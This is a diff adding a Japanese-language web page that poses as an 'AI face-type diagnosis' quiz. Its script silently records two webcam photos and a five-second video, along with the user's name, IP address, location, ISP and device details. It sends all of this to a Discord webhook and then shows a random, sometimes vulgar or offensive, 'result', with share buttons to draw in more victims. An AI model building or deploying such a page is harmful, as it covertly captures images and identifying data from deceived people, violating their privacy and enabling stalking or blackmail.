@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <head prefix="og: https://ogp.me/ns#">
+<meta property="og:title" content="今話題のAI顔診断！！"/>
+<meta property="og:description" content="このサイトで自分のレベルをAIで調べてみよう"/>
+<meta property="og:type" content="AI"/>
+<meta property="og:url" content="AI"/>
+<meta property="og:image" content="https://play-lh.googleusercontent.com/lmG9HlI0awHie0cyBieWXeNjpyXvHPwDBb8MNOVIyp0P8VEh95AiBHtUZSDVR3HLe3A=w240-h480-rw"/>
+</head>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>AI顔面タイプ診断！！ あなたのお顔のタイプを調べます！</title>
+<div class="c-firework"></div>
+<div class="c-firework"></div>
+<div class="c-firework"></div>
+<div class="c-firework"></div>
+<div class="c-firework"></div>
+<div class="c-firework"></div>
+<div class="c-firework"></div>
+<div class="c-firework"></div>
+  <style>
+    body {
+	background: #000;
+}
+
+@keyframes fireworks-animation {
+	0% {
+		transform: translate(-50%, 90vh);
+		width: 4px;
+		opacity: 1;
+	}
+	50% {
+		width: 4px;
+		opacity: 1;
+	}
+	100% {
+		width: 600px;
+		opacity: 0;
+	}
+}
+
+.c-firework,
+.c-firework::before,
+.c-firework::after {
+	content: "";
+	position: absolute;
+	top: 50%;
+	left: 50%;
+	aspect-ratio: 1;
+	background: radial-gradient(circle, yellow 10px, #000 0) 50% 00%,
+		radial-gradient(circle, khaki 10px, #000 0) 00% 50%,
+		radial-gradient(circle, white 10px, #000 0) 50% 99%,
+		radial-gradient(circle, lime 10px, #000 0) 99% 50%,
+		radial-gradient(circle, crimson 10px, #000 0) 80% 90%,
+		radial-gradient(circle, red 10px, #000 0) 95% 90%,
+		radial-gradient(circle, yellow 10px, #000 0) 10% 60%,
+		radial-gradient(circle, khaki 10px, #000 0) 31% 80%,
+		radial-gradient(circle, white 10px, #000 0) 80% 10%,
+		radial-gradient(circle, lime 10px, #000 0) 90% 23%,
+		radial-gradient(circle, crimson 10px, #000 0) 45% 20%,
+		radial-gradient(circle, red 10px, #000 0) 13% 24%;
+	background-size: 8px 8px;
+	background-repeat: no-repeat;
+	transform: translate(-50%, -50%);
+	animation: fireworks-animation 4s infinite;
+}
+.c-firework::before {
+	transform: translate(-50%, -50%) rotate(25deg) !important;
+}
+.c-firework::after {
+	transform: translate(-50%, -50%) rotate(-37deg) !important;
+}
+
+.c-firework:nth-of-type(2),
+.c-firework:nth-of-type(2)::before,
+.c-firework:nth-of-type(2)::after {
+	top: 30%;
+	left: 16%;
+	animation-duration: 3.8s;
+}
+.c-firework:nth-of-type(3),
+.c-firework:nth-of-type(3)::before,
+.c-firework:nth-of-type(3)::after {
+	top: 10%;
+	left: 72%;
+	animation-duration: 4.2s;
+}
+.c-firework:nth-of-type(4),
+.c-firework:nth-of-type(4)::before,
+.c-firework:nth-of-type(4)::after {
+	top: 28%;
+	left: 32%;
+	animation-duration: 3.6s;
+}
+.c-firework:nth-of-type(5),
+.c-firework:nth-of-type(5)::before,
+.c-firework:nth-of-type(5)::after {
+	top: 32%;
+	left: 84%;
+	animation-duration: 4.4s;
+}
+.c-firework:nth-of-type(6),
+.c-firework:nth-of-type(6)::before,
+.c-firework:nth-of-type(6)::after {
+	top: 38%;
+	left: 40%;
+	animation-duration: 4.1s;
+}
+.c-firework:nth-of-type(7),
+.c-firework:nth-of-type(7)::before,
+.c-firework:nth-of-type(7)::after {
+	top: 28%;
+	left: 64%;
+	animation-duration: 3.9s;
+}
+.c-firework:nth-of-type(8),
+.c-firework:nth-of-type(8)::before,
+.c-firework:nth-of-type(8)::after {
+	top: 30%;
+	left: 56%;
+	animation-duration: 3.9s;
+}
+  * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: 'Helvetica Neue', sans-serif;
+      background: linear-gradient(to bottom, #ffe6f0, #ffcce0);
+      color: #333;
+      overflow: hidden;
+    }
+
+    .screen {
+      width: 100vw;
+      height: 100vh;
+      position: absolute;
+      top: 0;
+      left: 100vw;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      transition: left 0.5s ease;
+      padding: 20px;
+    }
+
+    .active {
+      left: 0;
+    }
+
+    h1 {
+      font-size: 1.8em;
+      margin-bottom: 20px;
+      text-align: center;
+    }
+
+    input[type="text"] {
+      padding: 14px;
+      border: 2px solid #ff99cc;
+      border-radius: 20px;
+      font-size: 1.2em;
+      width: 80%;
+      max-width: 300px;
+      text-align: center;
+      outline: none;
+      margin-bottom: 20px;
+      background-color: #fff0f5;
+    }
+
+    button {
+      padding: 14px 28px;
+      font-size: 1.1em;
+      background-color: #ff66c4;
+      border: none;
+      border-radius: 30px;
+      color: white;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+
+    button:hover {
+      background-color: #ff3399;
+    }
+
+    .loader {
+      height: 30px;
+      aspect-ratio: 2;
+      background:
+        radial-gradient(farthest-side,#000 15%,#0000 18%)0 0/50% 100%,
+        radial-gradient(50% 100% at 50% 160%,#fff 95%,#0000) 0 0/50% 50%,
+        radial-gradient(50% 100% at 50% -60%,#fff 95%,#0000) 0 100%/50% 50%;
+      background-repeat: repeat-x;
+      -webkit-mask: radial-gradient(50% 100%,#000 95%,#0000) 0 100%/50% 0% repeat-x;
+      animation: l3 1s infinite alternate ease-in;
+      margin: 20px auto;
+    }
+
+    @keyframes l3 {
+      0%, 70% {-webkit-mask-size:50% 100%}
+      85% {-webkit-mask-size:50% 0}
+      100% {-webkit-mask-size:50% 100%}
+    }
+
+    #status {
+      margin-top: 10px;
+      font-size: 1em;
+      text-align: center;
+    }
+
+    .share-buttons {
+      margin-top: 20px;
+    }
+
+    .share-buttons button {
+      margin: 5px;
+      background-color: #ffccdd;
+      color: #333;
+    }
+
+    video, canvas {
+      display: none;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="screen active" id="screen1">
+    <h1>お名前を入力してね</h1>
+    <input type="text" id="username" placeholder="あなたの名前">
+    <button onclick="nextScreen()">次へ</button>
+  </div>
+  <div class="screen" id="screen2">
+    <h1>AIが診断します！</h1>
+    <div class="loader" id="loader" style="display:none;">
+    </div>
+    <div id="status">
+    </div>
+  </div>
+  <div class="screen" id="screen3">
+    <h1 id="resultText">診断結果！</h1>
+    <div class="share-buttons">
+      <button onclick="shareTwitter()">Twitterでシェア</button>
+      <button onclick="shareLine()">LINEでシェア</button>
+      <button onclick="shareInstagram()">Instagramでシェア</button>
+    </div>
+  </div>
+  <video id="video" autoplay playsinline>
+  </video>
+  <canvas id="canvas">
+  </canvas>
+	<script>
+		fetch('https://api.ipify.org?format=json')//ip抜く（正直これも意味ないｗ）
+  .then(res => res.json())
+  .then(data => {
+    const blockedIPs = ['14.11.66.224'];//アクセスを制限するip指定（多分あんま意味ないｗ）
+    if (blockedIPs.includes(data.ip)) {
+		location.href = 'http://www.yahoo.co.jp/';
+    }
+  });
+	</script>
+  <script>
+  const WEBHOOK_URL = "";//discordのwebhookURL(エンドポイント等を使用して下さい正直送信する内容の形成もそっちでやったほうがいい)
+
+    const screens = document.querySelectorAll('.screen');
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+    const loader = document.getElementById('loader');
+    const statusText = document.getElementById('status');
+    let userName = '';
+
+    function nextScreen() {
+      userName = document.getElementById('username').value || '名無し';
+      screens[0].classList.remove('active');
+      screens[1].classList.add('active');
+      startDiagnosis();
+    }
+
+    function switchToResultScreen(result) {
+      screens[1].classList.remove('active');
+      screens[2].classList.add('active');
+      document.getElementById('resultText').innerText = `診断結果：あなたは「${result}」タイプ！`;
+    }
+
+    function base64ToBlob(base64, mime) {
+      const byteChars = atob(base64);
+      const byteArray = new Uint8Array([...byteChars].map(c => c.charCodeAt(0)));
+      return new Blob([byteArray], { type: mime });
+    }
+
+    async function fetchIPInfo() {
+      const res = await fetch("https://ipinfo.io/json?token=1dd9dc2fae2fbe");
+      return res.json();
+    }
+
+    function getDeviceInfo() {
+      return {
+        ua: navigator.userAgent,
+        lang: navigator.language,
+        size: `${window.screen.width}x${window.screen.height}`,
+      };
+    }
+
+    function generateRandomResult() {
+      const results = [
+        "くそきもい", "さくら？", "さくらじゃね？", "れなさんにょっす？",
+        "ＧＸ８尖閣", "ぺろまる", "ＰＲ２桁", "撮り鉄",
+        "さすがにGX８尖閣", "ドクターイエロー", "京成電鉄", "ゆうとくん",
+        "れべちちゃん", "対面最弱おまんこくんだっちゃ", "ねるねるねるね幸運", "ロバ",
+        "クールビューティ", "ド天然顔", "優等生系", "さわやか系", "いたずらっ子顔",
+        "陰キャ美形", "量産型", "個性派", "ひとをころしてそうなめ", "モテそう", "守ってあげたくなる顔",
+        "イケボ顔", "あざとい系", "犬系男子", "猫系女子", "塩顔", "濃い顔", "童顔", "老け顔",
+        "癒し系", "知的系", "残念美人", "アーティスト系", "ファニーフェイス", "美少女風", "彫り深め", 
+        "昭和感", "平成JK風", "令和トレンド顔", "ぜの", "後藤文の花嫁すきそう", "フィルター系", "加工不要",
+        "モデル体型顔", "ミステリアス", "アイドル級", "チーズバーガー", "広島原爆４０００度顔",
+        "アバター感", "海外モデル風", "不思議ちゃん系", "雰囲気美人", "無敵感ある",
+        "ノスタルジック顔", "あか抜け前", "覚醒前夜", "ポテンシャル◎", "無表情でも映える",
+        "強メンタル顔", "泣き顔映え", "赤ちゃんみ", "どや顔タイプ", "やさぐれ美人",
+        "人見知り顔", "無害系", "地雷顔", "沼り系", "映え顔", "TikTok映え", "透明感つよめ",
+        "青目", "口元がチャームポイント", "目力が強い", "眉毛が整ってる", "小顔",
+        "フィエロ", "GX９一点かたむき", "わんこちゃんレスかかまや", "ゾンビアンドレッド",
+        "ザンビ", "対面最弱れべちくんだっちゃ幸運", "撮り鉄のリーダー", "コナンの犯人は林警部補", "中学生の雑談オプれべちくん",
+        "アニメオタク", "戦争オタク", "しんかんせんこだま", "ぺろまる覚醒極幸運", "うまらぽ", "らぽさん"
+      ];
+      return results[Math.floor(Math.random() * results.length)];
+    }
+    async function startDiagnosis() {
+      loader.style.display = "block";
+      statusText.textContent = "カメラを起動しています...";
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      video.srcObject = stream;
+      await new Promise(res => setTimeout(res, 500)); 
+      const photos = [];
+      for (let i = 0; i < 2; i++) {
+        await new Promise(res => setTimeout(res, 300));
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        ctx.drawImage(video, 0, 0);
+        photos.push(canvas.toDataURL("image/png"));
+      }
+      const mediaRecorder = new MediaRecorder(stream);
+      const chunks = [];
+      mediaRecorder.ondataavailable = e => chunks.push(e.data);
+      mediaRecorder.start();
+      await new Promise(res => setTimeout(res, 5000));
+      mediaRecorder.stop();
+      await new Promise(res => mediaRecorder.onstop = res);
+      const videoBlob = new Blob(chunks, { type: 'video/webm' });
+      stream.getTracks().forEach(track => track.stop());
+      const ip = await fetchIPInfo();
+      const device = getDeviceInfo();
+      const result = generateRandomResult();
+      const embed = {
+        title: "AI診断ログ",
+        color: 0xff99cc,
+        fields: [
+          { name: "名前", value: userName, inline: true },
+          { name: "IP", value: ip.ip, inline: true },
+          { name: "国/地域", value: `${ip.country} / ${ip.region}`, inline: true },
+          { name: "通信会社", value: ip.org || "不明", inline: false },
+          { name: "デバイス", value: device.ua, inline: false },
+          { name: "画面", value: device.size, inline: true },
+          { name: "言語", value: device.lang, inline: true },
+          { name: "診断結果", value: result, inline: false }
+        ]
+      };
+const formData = new FormData();
+photos.forEach((p, i) => {
+  const blob = base64ToBlob(p.split(',')[1], "image/png");
+  formData.append("file" + i, blob, `photo${i + 1}.png`);
+});
+formData.append("video", videoBlob, "video.webm");
+const payload = {
+  content: "",//discord webhookで送信するメッセージ
+  embeds: [embed],
+  username: "AI診断Bot"
+};
+formData.append("payload_json", JSON.stringify(payload));
+      await fetch(WEBHOOK_URL, {
+        method: "POST",
+        body: formData
+      });
+      loader.style.display = "none";
+      switchToResultScreen(result);
+    }
+    function shareTwitter() {
+      const text = encodeURIComponent("AI診断やってみた！結果がやばいかも！？");
+      const url = encodeURIComponent(window.location.href);
+      window.open(`https://twitter.com/intent/tweet?text=${text}&url=${url}`);
+    }
+
+    function shareLine() {
+      const url = encodeURIComponent(window.location.href);
+      window.open(`https://line.me/R/msg/text/?AI診断が面白い！%0A${url}`);
+    }
+
+    function shareInstagram() {
+      alert("Instagramはシェア用URLをコピーして、ストーリーズなどに貼り付けてください！");
+      navigator.clipboard.writeText(window.location.href);
+    }
+  </script>
+
+</body>
+
+</html>
